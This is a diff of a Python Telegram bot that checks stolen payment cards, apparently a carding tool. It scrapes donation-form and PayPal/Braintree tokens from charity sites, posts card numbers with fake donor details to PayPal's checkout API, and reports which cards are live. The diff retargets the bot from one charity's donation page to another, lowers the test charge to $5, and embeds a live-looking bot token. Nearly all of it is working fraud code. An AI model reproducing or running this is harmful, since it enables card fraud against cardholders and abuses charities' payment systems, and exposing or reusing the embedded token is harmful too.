@@ -6,7 +6,7 @@ import requests, random, os, pickle, time, re
 from bs4 import BeautifulSoup
 
 # توكن البوت
-token = '7545888216:AAGC6AyVVgqjxo611StXeB_QEqKvoW7sfCw'
+token = '8277908099:AAG8XA_s5fMe4D24RI4bEaVPsSpwv7LiAdM'
 bot = telebot.TeleBot(token, parse_mode="HTML")
 
 # ايدي حسابك
@@ -70,203 +70,195 @@ def pali(ccx):
     r = requests.Session()
     
 
+
     headers = {
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'accept-language': 'en-US',
-	    'cache-control': 'max-age=0',
-	    'priority': 'u=0, i',
-	    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'document',
-	    'sec-fetch-mode': 'navigate',
-	    'sec-fetch-site': 'none',
-	    'sec-fetch-user': '?1',
-	    'upgrade-insecure-requests': '1',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
-	}
-	
-    response1 = r.get(
-	    'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/',
-	    headers=headers,
-	)
-	
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US',
+    'cache-control': 'max-age=0',
+    'if-none-match': '"14498-1772191193;br"',
+    'priority': 'u=0, i',
+    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
+}
+
+    response1 = r.get('https://jvf-nepal.org/donations/education/', headers=headers)
+
     hash = re.search(r'name="give-form-hash" value="(.*?)"', response1.text).group(1)
-				
-				
     iid = re.search(r'name="give-form-id" value="(.*?)"', response1.text).group(1)
-				
-				
     prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', response1.text).group(1)
-			
     lol = re.search(r'"data-client-token":"(.*?)"', response1.text).group(1)
     kol = base64.b64decode(lol).decode('utf-8')
     la = re.findall(r'"accessToken":"(.*?)"', kol)[0]
-	
+
     headers = {
-	    'accept': '*/*',
-	    'accept-language': 'en-US',
-	    'origin': 'https://gullottahouse.org',
-	    'priority': 'u=1, i',
-	    'referer': 'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/',
-	    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
-	}
-	
+    'accept': '*/*',
+    'accept-language': 'en-US',
+    'origin': 'https://jvf-nepal.org',
+    'priority': 'u=1, i',
+    'referer': 'https://jvf-nepal.org/donations/education/',
+    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
+}
+
     params = {
-	    'action': 'give_paypal_commerce_create_order',
-	}
-	
+    'action': 'give_paypal_commerce_create_order',
+}
+
     data = {
-	    'give-fee-amount': (None, '0.7'),
-	    'give-fee-mode-enable': (None, 'false'),
-	    'give-fee-status': (None, 'enabled'),
-	    'give-honeypot': (None, ''),
-	    'give-form-id-prefix': (None, prefix),
-	    'give-form-id': (None, iid),
-	    'give-form-title': (None, "JP Doyle's Spaghetti Night Fundraiser"),
-	    'give-current-url': (None, 'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/'),
-	    'give-form-url': (None, 'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/'),
-	    'give-form-minimum': (None, '10.00'),
-	    'give-form-maximum': (None, '1000000.00'),
-	    'give-form-hash': (None, hash),
-	    'give-recurring-logged-in-only': (None, ''),
-	    'give-logged-in-only': (None, '1'),
-	    '_give_is_donation_recurring': (None, '0'),
-	    'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
-	    'give-amount': (None, '10.00'),
-	    'give-recurring-period-donors-choice': (None, 'month'),
-	    'give-fee-recovery-settings': (None, '{"fee_data":{"paypal-commerce":{"percentage":"1.990000","base_amount":"0.490000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"},"offline":{"percentage":"0.000000","base_amount":"0.000000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"donor_opt_in","is_fee_mode":true,"fee_recovery":true}'),
-	    'payment-mode': (None, 'paypal-commerce'),
-	    'give_first': (None, 'Haben'),
-	    'give_last': (None, 'Nsbe'),
-	    'give_email': (None, 'joane73@gmail.com'),
-	    'give_comment': (None, ''),
-	    'card_name': (None, 'Vaem habe'),
-	    'card_exp_month': (None, ''),
-	    'card_exp_year': (None, ''),
-	    'give-gateway': (None, 'paypal-commerce'),
-	}
-	
+    'give-honeypot': (None, ''),
+    'give-form-id-prefix': (None, prefix),
+    'give-form-id': (None, iid),
+    'give-form-title': (None, 'Education'),
+    'give-current-url': (None, 'https://jvf-nepal.org/donations/education/'),
+    'give-form-url': (None, 'https://jvf-nepal.org/donations/education/'),
+    'give-form-minimum': (None, '1.00'),
+    'give-form-maximum': (None, '999999.99'),
+    'give-form-hash': (None, hash),
+    'give-amount': (None, '1.00'),
+    'payment-mode': (None, 'paypal-commerce'),
+    'give_first': (None, 'Jaoen'),
+    'give_last': (None, 'Kqme'),
+    'give_email': (None, 'joane73@gmail.com'),
+    'give_comment': (None, ''),
+    'card_name': (None, 'John deba'),
+    'card_exp_month': (None, ''),
+    'card_exp_year': (None, ''),
+    'billing_country': (None, 'US'),
+    'card_address': (None, 'Kardio'),
+    'card_address_2': (None, 'Nameva'),
+    'card_city': (None, 'New York'),
+    'card_state': (None, 'NY'),
+    'card_zip': (None, '10080'),
+    'give-gateway': (None, 'paypal-commerce'),
+}
+
     response2 = r.post(
-	    'https://gullottahouse.org/wp-admin/admin-ajax.php',
-	    params=params,
-	    headers=headers,
-	    data=data,
-	)
-	
+    'https://jvf-nepal.org/wp-admin/admin-ajax.php',
+    params=params,
+    headers=headers,
+    data=data,
+)
+
     joker= (response2.json()['data']['id'])
-	
+
+
+
     headers = {
-	    'accept': '*/*',
-	    'accept-language': 'en-US',
-	    'authorization': f'Bearer {la}',
-	    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
-	    'content-type': 'application/json',
-	    'origin': 'https://assets.braintreegateway.com',
-	    'paypal-client-metadata-id': 'e456cfee79de4da4d38ad6fef4b59be3',
-	    'priority': 'u=1, i',
-	    'referer': 'https://assets.braintreegateway.com/',
-	    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'cross-site',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
-	}
-	
+    'accept': '*/*',
+    'accept-language': 'en-US',
+    'authorization': f'Bearer {la}',
+    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
+    'content-type': 'application/json',
+    'origin': 'https://assets.braintreegateway.com',
+    'paypal-client-metadata-id': '83b9b2132863dd7f107777edcf8937ee',
+    'priority': 'u=1, i',
+    'referer': 'https://assets.braintreegateway.com/',
+    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
+}
+
     json_data = {
-	    'payment_source': {
-	        'card': {
-	            'number': n,
-	            'expiry': f'20{yy}-{mm}',
-	            'security_code': cvc,
-	            'attributes': {
-	                'verification': {
-	                    'method': 'SCA_WHEN_REQUIRED',
-	                },
-	            },
-	        },
-	    },
-	    'application_context': {
-	        'vault': False,
-	    },
-	}
-	
+    'payment_source': {
+        'card': {
+            'number': n,
+            'expiry': f'20{yy}-{mm}',
+            'security_code': cvc,
+            'attributes': {
+                'verification': {
+                    'method': 'SCA_WHEN_REQUIRED',
+                },
+            },
+        },
+    },
+    'application_context': {
+        'vault': False,
+    },
+}
+
     response3 = r.post(
-	    f'https://cors.api.paypal.com/v2/checkout/orders/{joker}/confirm-payment-source',
-	    headers=headers,
-	    json=json_data,
-	)
-	
-	
+    f'https://cors.api.paypal.com/v2/checkout/orders/{joker}/confirm-payment-source',
+    headers=headers,
+    json=json_data,
+)
+
+
     headers = {
-	    'accept': '*/*',
-	    'accept-language': 'en-US',
-	    'origin': 'https://gullottahouse.org',
-	    'priority': 'u=1, i',
-	    'referer': 'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/',
-	    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
-	}
-	
+    'accept': '*/*',
+    'accept-language': 'en-US',
+    'origin': 'https://jvf-nepal.org',
+    'priority': 'u=1, i',
+    'referer': 'https://jvf-nepal.org/donations/education/',
+    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
+}
+
     params = {
-	    'action': 'give_paypal_commerce_approve_order',
-	    'order': joker,
-	}
-	
+    'action': 'give_paypal_commerce_approve_order',
+    'order': joker,
+}
+
     data = {
-	    'give-fee-amount': (None, '0.7'),
-	    'give-fee-mode-enable': (None, 'false'),
-	    'give-fee-status': (None, 'enabled'),
-	    'give-honeypot': (None, ''),
-	    'give-form-id-prefix': (None, prefix),
-	    'give-form-id': (None, iid),
-	    'give-form-title': (None, "JP Doyle's Spaghetti Night Fundraiser"),
-	    'give-current-url': (None, 'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/'),
-	    'give-form-url': (None, 'https://gullottahouse.org/donations/jp-doyles-spaghetti-night-fundraiser/'),
-	    'give-form-minimum': (None, '10.00'),
-	    'give-form-maximum': (None, '1000000.00'),
-	    'give-form-hash': (None, hash),
-	    'give-recurring-logged-in-only': (None, ''),
-	    'give-logged-in-only': (None, '1'),
-	    '_give_is_donation_recurring': (None, '0'),
-	    'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
-	    'give-amount': (None, '10.00'),
-	    'give-recurring-period-donors-choice': (None, 'month'),
-	    'give-fee-recovery-settings': (None, '{"fee_data":{"paypal-commerce":{"percentage":"1.990000","base_amount":"0.490000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"},"offline":{"percentage":"0.000000","base_amount":"0.000000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"donor_opt_in","is_fee_mode":true,"fee_recovery":true}'),
-	    'payment-mode': (None, 'paypal-commerce'),
-	    'give_first': (None, 'Haben'),
-	    'give_last': (None, 'Nsbe'),
-	    'give_email': (None, 'joane73@gmail.com'),
-	    'give_comment': (None, ''),
-	    'card_name': (None, 'Vaem habe'),
-	    'card_exp_month': (None, ''),
-	    'card_exp_year': (None, ''),
-	    'give-gateway': (None, 'paypal-commerce'),
-	}
-	
+    'give-honeypot': (None, ''),
+    'give-form-id-prefix': (None, prefix),
+    'give-form-id': (None, iid),
+    'give-form-title': (None, 'Education'),
+    'give-current-url': (None, 'https://jvf-nepal.org/donations/education/'),
+    'give-form-url': (None, 'https://jvf-nepal.org/donations/education/'),
+    'give-form-minimum': (None, '1.00'),
+    'give-form-maximum': (None, '999999.99'),
+    'give-form-hash': (None, hash),
+    'give-amount': (None, '1.00'),
+    'payment-mode': (None, 'paypal-commerce'),
+    'give_first': (None, 'Jaoen'),
+    'give_last': (None, 'Kqme'),
+    'give_email': (None, 'joane73@gmail.com'),
+    'give_comment': (None, ''),
+    'card_name': (None, 'John deba'),
+    'card_exp_month': (None, ''),
+    'card_exp_year': (None, ''),
+    'billing_country': (None, 'US'),
+    'card_address': (None, 'Kardio'),
+    'card_address_2': (None, 'Nameva'),
+    'card_city': (None, 'New York'),
+    'card_state': (None, 'NY'),
+    'card_zip': (None, '10080'),
+    'give-gateway': (None, 'paypal-commerce'),
+}
+
     response4 = r.post(
-	    'https://gullottahouse.org/wp-admin/admin-ajax.php',
-	    params=params,
-	    headers=headers,
-	    data=data,
-	)
+    'https://jvf-nepal.org/wp-admin/admin-ajax.php',
+    params=params,
+    headers=headers,
+    data=data,
+)
+
+
     
     text = response4.text
     if 'true' in text or 'sucsess' in text:    
-        return 'CHARGE 10.00$'
+        return 'CHARGE 5.00$'
     elif 'DO_NOT_HONOR' in text:
         return "DO_NOT_HONOR"
     elif 'ACCOUNT_CLOSED' in text:
@@ -511,7 +503,7 @@ def GTA(message):
     name = message.from_user.first_name or message.from_user.username or "User"
 
     bts = types.InlineKeyboardMarkup()
-    soso = types.InlineKeyboardButton(text='PayPal Custom 10.00$', callback_data='ottpa2')
+    soso = types.InlineKeyboardButton(text='PayPal Custom 5.00$', callback_data='ottpa2')
     bts.add(soso)
     bot.reply_to(message, 'Select the type of examination', reply_markup=bts)
     try:
@@ -593,7 +585,7 @@ Dev! : @B11HB''')
 - - - - - - - - - - - - - - - - - - - - - - -
 [<a href="https://t.me/B">⌤</a>] 𝐃 𝐛: <a href='tg://user?id=6052713305'>Alilwe</a> - 🍀</strong>'''
 
-                if 'CHARGE 10.00$' in last or 'INSUFFICIENT_FUNDS' in last:
+                if 'CHARGE 5.00$' in last or 'INSUFFICIENT_FUNDS' in last:
                     passs += 1
                     bot.send_message(call.from_user.id, msg, parse_mode="HTML")
                 else:
